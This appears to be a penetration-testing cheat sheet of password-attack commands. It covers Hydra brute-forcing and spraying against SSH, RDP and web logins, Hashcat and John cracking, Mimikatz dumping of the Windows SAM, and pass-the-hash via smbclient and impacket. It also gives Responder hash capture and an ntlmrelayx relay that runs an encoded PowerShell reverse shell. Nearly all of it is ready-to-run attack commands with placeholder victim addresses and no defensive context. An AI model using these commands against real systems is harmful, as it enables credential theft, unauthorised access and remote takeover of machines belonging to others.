# Password attacks

Graphics card cracking: https://www.tomshardware.com/news/eight-rtx-4090s-can-break-passwords-in-under-an-hour

## Hydra

### Wordlist

```
hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
hydra -l user -P wordlist.txt rdp://IpVictim # default is 3389
```

### Spraying

```
hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
```

### Http

```
hydra -P wordlist.txt http-post-form $IpVictim "/baseurl:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
hydra -l user -P wordlist.txt http-get $IpVictim
```

## Hashcat

```
hashcat wordlist.txt -j 'd' wordlist.txt --stdout > newwordlist.txt
hastcat wordlist.txt -r rulelist.txt --stdout
hashcat -m 0 tocrack.txt -k 'u' newwordlist.txt --force
hashcat -m passman.mode passman.hash rockyou.txt -r rockyou-30000.rule --force
```

## Powershell

Find extensions:
```
Get-ChildItem -Path C:\ -Include *.someextension -File -Recurse -ErrorAction SilentlyContinue
```

## Ssh passphrase

```
ssh2john id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m ssh.hashcat.mode ssh.hash ssh.passwords -r ssh.rule --force
cp ssh.rule /etc/john/otherssh.rule
vim /etc/john/john.config
john --wordlist=ssh.passwords --rules=sshJohnRules ssh.hash
```

## NTLM

On Windows:
```
Get-LocalUser
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```
Back on Kali:
```
hashcat -h | grep -i ntlm
hashcat -m ntlm.mode user.hash /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
```

## Pass NTLM

```
smbclient \\\\IpVictim\\someshare -U Administrator --pw-nt-hash adminhash # smb> get file.txt
impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # nt authority\system
impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # host\administrator

```

## Net-NTLMv2

Kali
```
sudo responder -I ethX
```
Windows
```
smb \\IpAtt\fakeshare
```
then `hashcat`

## Relay Net-NTLMv2

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim -c "powershell -enc base64reverseshell"
```
